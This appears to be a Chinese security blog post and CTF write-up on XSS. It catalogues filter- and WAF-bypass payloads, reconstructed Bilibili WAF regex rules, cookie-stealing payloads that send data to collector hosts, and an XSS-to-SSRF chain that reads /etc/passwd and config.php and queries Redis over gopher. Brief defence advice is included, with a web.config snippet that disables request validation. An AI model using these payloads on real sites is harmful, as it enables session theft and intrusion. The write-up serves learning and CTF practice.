---
layout:     post
title:      BypassWaf_xss
date:       2018-12-30
author:     Wh0ale
header-img: img/jade_by_wlop-d9n5wvp.jpg
catalog: true
tags:
    - xss
---

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyp4d6xll2j20ye0dy403.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fys1velc7qj210y0w6acr.jpg)

# 0x01 什么是XSS漏洞

XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。

跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。

## 一、 XSS分类

> 反射型（非持久型）
> 存储型（持久型）
> DOM型
> 不常见的XSS:
> mXSS 突变型XSS
> UXSS 通用型XSS
> Flash XSS
> UTF-7 XSS
> MHTML XSS
> CSS XSS
> VBScript XSS

**存储型**

存储型XSS也叫持久型XSS，存储的意思就是Payload是有经过存储的，当一个页面存在存储型XSS的时候，XSS注入成功后，那么每次访问该页面都将触发XSS。

**反射型**

反射型XSS也叫非持久型XSS，最常见的是Payload是构造在网址的某个GET参数的值里。

**DOM 型**

基于DOM的XSS有时也称为type0XSS。当用户能够通过交互修改浏览器页面中的DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞，从效果上来说它也是反射型XSS。通过修改页面的DOM节点形成的XSS，称之为DOMBasedXSS。

## 二、 xss bypass

### 检测过滤情况

用于有字符限制的短探测器
 `'';!--"<XSS>=&{()}`
 完全版探测器
 `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`

### 观察输出位置

#### 1.标签之间

```
模型： <div>[xss]</div> payload： <script>alert(1)</script>或者<img src=1 onerror=alert(1)>
这些标签有：
<a> <p> <img> <body> <button> <var> <div> <object> <input> <select> <keygen> <frameset>  <embed> <svg> <video> <audio>
       
自带HtmlEncode（转义）功能的标签(RCDATA)，这是插入的javascript不会被执行，除非我们闭合掉它们。
<textarea></textarea> <title></title> <iframe></iframe> <noscript></noscript> <noframes></noframes> <xmp></xmp> <plaintext></plaintext> 其他：<math></math>也不行
```

#### 2.js标签之间

在该位置，空格被过滤，可用/**/代替空格。输出在注释中，通过换行符%0a %0d使其逃逸出来。

##### (1)不在字符串内

判断<>/是否被过滤。如果没有，那么直接插入就可以。

```JavaScript
<script>
[output]
</script>
payload：</script><script>alert(1)</script>
```

##### (2)在字符串中

此时需要闭合字符串，并保证插入的JS代码符合语法规范。

```
<script>
Var x="Input";
</script>
```

 input是输出点，我们首先要闭合双引号，才能保证XSS成功。如果我们无法闭合包括字符串的引号（引号被转义），就很难利用，除非存在两个输出点或宽字节。(详见参考资料)

#### 3.输出在HTML属性内

##### (1)文本属性中

例如：`<input value="输出"> 、 <img onload="...[输出]..."> ，再比如 <body style="...[输出]...">`

**无引号包裹，直接添加新的事件属性。**

**有引号包括。首先测试引号是否可用，可用则闭合属性之后添加新的事件属性。**

> HTML的属性，如果被进行HTML实体编码(形如'&#x27)，那么HTML会对其进行自动解码，从而我们可以在属性里以HTML实体编码的方式引入任意字符，从而方便我们在事件属性里以JS的方式构造payload。当然，也可以闭合属性后，然后再执行脚本。

##### (2)src/href/action/xlink:href/autofocus/content/data 等属性

直接使用伪协议绕过。

```
javascript 伪协议： <a href=javascript:alert(2)>test</a>
data 协议执行 javascript： <a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==>test</a>(Chrome被拦截，Firefox可以)
urlencode 版本： <a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E>(测试未通过)
不使用 href 的另外一种组合来执行 js： <svg><a xlink:href="javascript:alert(14)"><rect width="1000" height="1000" fill="white"/></a></svg>（均可） 或者： 
<math><a xlink:href=javascript:alert(1)>1</a></math>(Chrome不可，Firefox可以)
```

##### (3)on*事件中

 插入合乎逻辑的JS代码即可。也可以使用伪协议。

```JavaScript
onload 
onclick
onunload 
onchange 
onsubmit 
onreset 
onselect 
onblur 
onfocus 
onabort 
onkeydown 
onkeypress 
onkeyup 
ondbclick 
onmouseover 
onmousemove 
onmouseout 
onmouseup 
onforminput 
onformchange 
ondrag 
ondrop
```

### 绕过waf

**单次过滤规则绕过：**`<scr<script>ipt>`
**大小写绕过：**<sCript>
**alert绕过：**可以尝试prompt和confirm
**没有斜杠：**`<IMG SRC=javascript:alert('XSS')>`
**空格被过滤：**`<img/src=""onerror=alert(2)>` `<svg/onload=alert(2)></svg>`
**长度限制时：**
 (1)`<q/oncut=alert(1)>`
 (2)

```
<script>z=’document.’</script> <script>z=z+’write(“‘</script> <script>z=z+’<script’</script> <script>z=z+’ src=ht’</script> <script>z=z+’tp://ww’</script>
<script>z=z+’w.shell’</script> <script>z=z+’.net/1.’</script> <script>z=z+’js></sc’</script>
<script>z=z+’ript>”)’</script> <script>eval_r(z)</script>
```

单引号及双引号被过滤情况：`<script>alert(/jdq/)</script> //用双引号会把引号内的内容单独作为内容 用斜杠，则会连斜杠一起回显`
 **javascript伪协议：**

```JavaScript
<a href="javascript:alert(/test/)">xss</a>
<iframe src=javascript:alert('xss');height=0 width=0 /><iframe>利用iframe框架标签
```

**畸形payload：**

``` 
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
```

**括号被过滤,可以使用throw来抛出数据**

```JavaScript
<a onmouseover="javascript:window.onerror=alert;throw 1">2</a>
<img src=x onerror="javascript:window.onerror=alert;throw 1">
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
```

**当=();:被过滤时：**

过滤某些关键字（如：javascript） 可以在属性中的引号内容中使用空字符、空格、TAB换行、注释、特殊的函数，将代码行隔开。比如在使用<iframe src="javascript:alert(1253)" height=0 width=0 /><iframe>时，可以用回车、Tab键将src中的内容隔开，回车的url编码为%0a,%0b;

 **拼凑法：**① 双写绕过；② 使用js定义变量z=scri, z+pt=script; ③ 两处输出点

```
<scri<!-- 第二处-->pt>;
```

无法使用href：

```JavaScript
<a onmouseover="alert(document.cookie)">xxs link</a>
在chrome下，其回补全缺失的引号。因此，也可以这样写：
<a onmouseover=alert(document.cookie)>xxs link</a>
```

### 编码

JS函数（如eval，settimeout）还有就是`href= action= formaction= location= on*= name= background= poster= src= code=`这些地方，可以配合编码。此外，data属性可以base64编码。
 1.js16进制

```JavaScript
<script>eval(“js+16进制加密”)</script> <script>eval("\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29")</script> 编码要执行的语句↓
Alert(“xss”)
```

2.js unicode

```JavaScript
<script>eval("unicode加密")</script> //js unicode加密 解决alert()被过滤
<script>eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029")</script>
```

3.String.fromCharCode函数（不需要任何引号，必须函数内）

```JavaScript
<script>eval(String.fromCharCode编码内容))</script> <script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))</script>
```

4.jsfuck版本

```JavaScript
<script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>
```

>　　这是一个黑客奇葩的想法。
>
>　　在黑客行为中，你的js代码可能被关键词检测，于是考虑躲避关键词检测的想法，例如 eval等关键词。
>
>　　1、想了各种方法来规避这个检测。
>
>　　2、把方法写成通用的程序。
>
>　　3、把包含的字符做到极致，最后只剩下 ()+[]!  这六个字符。
>
> 这段代码来着于这个网站转码得到：<http://www.jsfuck.com/>   
>
>这里是它的百科，感兴趣可以去了解下：<https://en.wikipedia.org/wiki/JSFuck>
>
>1、脚本注入时防止过滤
>
>2、一定程度加密关键代码（生成代码很长，不适合加密大量代码。只能一定程度上加密，不能依赖）
>
>3、装逼用（我最中意的用途）
>
>结论：转换后本质依然是javascript，通过javascript的一些性质来生成，具体实现可以看这里的代码<https://github.com/aemkei/jsfuck>

5.HTML编码

```
<img src='1' onerror='aler&#x0074;(1)'>
```

6.base64编码（仅data支持）

```
     <object data="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUnE5bjZ6dT48L3NjcmlwdD4="></object>
     格式：
     Data:<mime type>,<encoded data>
     Data //协议
     <mime type> //数据类型
     charset=<charset>  //指定编码
     [;base64] //被指定的编码
     <encoded data> //定义data协议的编码
     特点：不支持IE
```



# 0x02 非基于Web的XSS注射

**PowerDNS Recursor** 

在我们的演讲中，Chris提到他在一个流行的DNS软件中发现了一个不常见的XSS，所以我决定从它开始强调网络并不总是唯一的攻击媒介。

PowerDNS Recursor是一款高端，高性能的解析名称服务器，可为至少1亿用户的DNS解析提供支持。Recursor是两个名称服务器产品之一，其主要目标是充当解析DNS服务器。


一个[详细的演练](https://blog.fortinet.com/2017/12/02/powerdns-recursor-html-script-injection-vulnerability-a-walkthrough)解释它是如何可能通过使用命令行工具挖一个DNS查询来注入XSS有效载荷：

![img](https://www.websec.ca/img/three-non-web-based-xss-injections/dig.png)



而这又在Web UI中呈现：

![img](https://www.websec.ca/img/three-non-web-based-xss-injections/powerdns.png)



**Symantec SSL Toolbox**这是我在三年前在Symantec的SSL证书测试程序中找到并报告的已修复漏洞。此[免费在线服务](https://cryptoreport.websecurity.symantec.com/checker/)用于从给定URL的x509 SSL证书中提取和显示值，信任其内容，而无需清理字段中的数据。


因此，我在不同的字段中创建了一个值为“<script> alert（document.cookie）; </ script>”的SSL证书，并将其安装在Web服务器的前面：

![img](https://www.websec.ca/img/three-non-web-based-xss-injections/symantec.png)



分析此类证书的结果是正在执行的JavaScript代码：

![ximg](https://www.websec.ca/img/three-non-web-based-xss-injections/symantec-xss.png)



**RATS（安全性粗略审计工具）**由CERN计算机安全部门开发，[RATS](https://security.web.cern.ch/security/recommendations/en/codetools/rats.shtml)是一个非常好的静态代码分析工具。我喜欢它并且已经使用它多年了。然而，最后一个版本可以追溯到2013年12月，现在可能没有维护，但不确定。


去年我在火车上很无聊，发现这个无用的XSS。RATS收到一个包含源代码的文件夹，并创建一个包含结果的HTML报告，其中还包括所分析文件的名称，因此攻击向量非常明显。我在其名称中创建了一个包含JavaScript代码的文件：

![img](https://www.websec.ca/img/three-non-web-based-xss-injections/rats.png)



分析之后，注入的JavaScript将在报告中呈现：

![img](https://www.websec.ca/img/three-non-web-based-xss-injections/rats-xss.png)



# 0x03 CTF赛题

[XSS的威力：从XSS到SSRF再到Redis](https://www.anquanke.com/post/id/156377)

## **一、xssme**

payload：

```
<svg/onload="document.location='http://vps_ip:23333'">
```

vps：

```
nc -l -vv -p 23333
```

收获flag

```
<svg/onload="document.location='http://ugelgr.ceye.io/?'+document.cookie">
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fypr96reo5j20jc07ojst.jpg)

解码后得到

```
PHPSESSID=9crkuhdqs9b1jkslebpieprr86; FLAG_XSSME=FLAG{Sometimes, XSS can be critical vulnerability <script>alert
```



## **二、xssrf leak**

xss去本地访问，再将页面内容打出来

```JavaScript
<svg/onload="document.location='http://ugelgr.ceye.io/?'+btoa(document.body.innerHTML)">
```

**编码绕过**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fypreygzbrj20lz0a1dmd.jpg)

**解码后保存到本地html里打开**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyprfv1be7j20re0lcmyx.jpg)

发现多了一个send request的功能，跟过去看代码发现多了一个send request的功能，跟过去看代码
[![img](https://p5.ssl.qhimg.com/t016761eb473b221e42.png)](https://p5.ssl.qhimg.com/t016761eb473b221e42.png)

没错，是多了一个request.php
那么结合题目意思，应该是有ssrf，我想应该就是利用这里的request.php了吧
那么继续去读这个页面的html

```html
<svg/onload="
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open("GET","request.php",true);
xmlhttp.send();
">
```



经过编码后发送，得到
![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyprjod9cbj21e6076n0h.jpg)同样解码后发现代码
![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyprkntdnjj21900h2jsr.jpg)应该xss的点就是在这里了
于是尝试file协议读`/etc/passwd`

```html
<svg/onload="
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open("POST","request.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=file:///etc/passwd");
">
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyprlccny8j2178182k0b.jpg)发现成功读取了`/etc/passwd`
那么我们回想到最初的文件

```
User-agent: *
Disallow: /config.php
Disallow: /you/cant/read/config.php/can/you?
Disallow: /backup.zip
```

于是直接读config.php

```html
<svg/onload="
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open("POST","request.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=file:///var/www/html/config.php");
">
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyprly0fcwj21b012en16.jpg)cool，于是我们拿到了第二个flag

```
FLAG{curl -v -o flag --next flag://in-the.redis/the?port=25566&good=luck}
```

## **三、xssrf redis**

只剩下最后一步打redis了

这里很容易就想到了gopher未授权访问打redis
上一题提示我们redis再25566端口，于是我们尝试访问一下

```html
<svg/onload="
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open("POST","request.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=gopher://127.0.0.1:25566/_info%250a_quit");
">
```

于是愉快的打出信息，发现果然是未授权访问
![](https://ws1.sinaimg.cn/large/b6de3d7dly1fypro47h7hj20w211o0vi.jpg)那么看看key有哪些

```
xmlhttp.send("url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit");
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyprovnhvtj20nq0vm75o.jpg)发现了flag
然后我们尝试读取

```
xmlhttp.send("url=gopher://127.0.0.1:25566/_get%2520flag%250a_quit");
```

发现报错
![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyprpnzlqij21020eaab5.jpg)发现类型错误了
那我们看看类型

```
xmlhttp.send("url=gopher://127.0.0.1:25566/_type%2520flag%250a_quit");
```

[![img](https://p3.ssl.qhimg.com/t01c56b570a1f671daa.png)](https://p3.ssl.qhimg.com/t01c56b570a1f671daa.png)

发现是个list
那我们看看长度

```
xmlhttp.send("url=gopher://127.0.0.1:25566/_llen%2520flag%250a_quit");
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyprrfqsanj20qg0kut9v.jpg)发现是53
那我们可以愉快的读取list了

```
xmlhttp.send("url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit");
```

[![img](https://p0.ssl.qhimg.com/t016b256ff57a040832.png)](https://p0.ssl.qhimg.com/t016b256ff57a040832.png)

我们把它拼接起来

[![img](https://p2.ssl.qhimg.com/t01584c35dc674b052a.png)](https://p2.ssl.qhimg.com/t01584c35dc674b052a.png)so cool
得到最后的flag

```
FLAG{Rediswithout authentication is easy to exploit}
```



# 0x04 B站waf

xss探针

```javascript
';`"><aaa bbb=ccc>ddd<aaa/>
aaa</script>bbb<script>ccc
```

payload

```javascript
<img src=x onerror=alert(1)>
<script>alert(1)<script>
top['alert'](1)
top['al'+'ert'](1)
```

至今已发现的b站waf规则总结：

```javascript
on\w+=(?:prompt|alert|confirm){1}\(\w+\)

<[^>]*\s+on\w+=(?:prompt|alert|confirm){1}\(\w+  

<script>[^`]*document\[\w+\]

<script>[^`]*document\.\w+

<script>\w+\.cookie

<script\s(.*\s)?src(=\w+)?>

<a\s(.*\s)?href=javascript:.*>

<img\s[^>]*on\w+=\w+\[\w*\]\(\w*\)

<img\s[^>]*on\w+=`\w*`.*
```



# 0x05 实战

## 一、pdf xss

在新建文档中添加页面属性

在动作标签运行JavaScript命令`app.alert(‘XSS’);`

然后保存为PDF文件

打开pdf文件，JavaScript代码执行

尝试把 PDF 文件嵌入到网页中并试运行。创建一个 HTML 文档，代码如下：

```html
<html>
<body>
<object
data="test.pdf" width="100%" heigh="100%"
type="application/pdf"></object>
</body>
</html>
```

除了把 JavaScript 嵌入 PDF 文件中执行，还可以利用基于 DOM 的方法执行 PDF XSS。

**修复方法**

　　而作为网站管理员或开发者，可以选择强迫浏览器下载 PDF 文件，而不是提供在线浏览等，或修改 Web 服务器配置的 header 和相关属性。

　　可以使用第三方插件解析pdf，不用chrome自带的pdf解析就行，https://github.com/adobe-type-tools/cmap-resources

参考链接：

[https://www.t00ls.net/thread-48480-1-1.html](https://www.t00ls.net/thread-48480-1-1.html)

[https://blog.xss.lc/experience-sharing/71.html](https://blog.xss.lc/experience-sharing/71.html)



## 二、上传文件处XSS

在上传的图片内容中插入xss攻击的payload，之后访问返回的name文件，可触发xss代码。

修改页面内容为payload

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz2f87r87wj20l607o0vf.jpg)

访问图片url触发xss

**安全建议**：

(1) 判断参数的合法性，不合法不返回任何内容。

(2) 对用户输入进行html实体编码，并过滤常见html标签及javascript脚本。



**文件上传处文件名XSS**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz2fcazc3bj20qy0ezwiv.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz2fe0qt0gj20r00d6djd.jpg)

**安全建议：**

(1) 判断参数的合法性，不合法不返回任何内容。

(2) 严格限制URL参数输入值的格式，不能包含不必要的特殊字符（%0d、%0a、%0D、%0A等）。

(3) 针对Cookie设置HttpOnly策略。

(4) 针对ASP.NET的防XSS库，Microsoft有提供统一的库，具体可以参见如下链接微软官网：

修改web.config文件:

```
<configuration>

    <system.web>

        <pages validateRequest="false" />

    </system.web>

</configuration>
```

[http://msdn.microsoft.com/en-us/library/aa973813.aspx](http://msdn.microsoft.com/en-us/library/aa973813.aspx)



## 三、excel模版xss

从本地导入excel表格，表格内数据含xss payload 即可触发XSS漏洞

payload：

```javascript
<img src=x onerror=alert(1)>
<img/src=""onerror=alert(2)>
<src=x onerror=alert(1)>
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz2flkrd5pj20hm0b9ace.jpg)







# 0x06 防御

1、HTML实体化编码，预防xss漏洞。

2、对特殊字符，例如’ “ >< % 等进行过滤。

3、传递参数时对cookies进行校验，防止越权漏洞。

4、开启CSP或HTTPONLY，防止用户凭证泄露。

# 0x07 补充CSP

<https://www.jianshu.com/p/f1de775bc43e>

<https://xz.aliyun.com/t/4074#toc-8>




























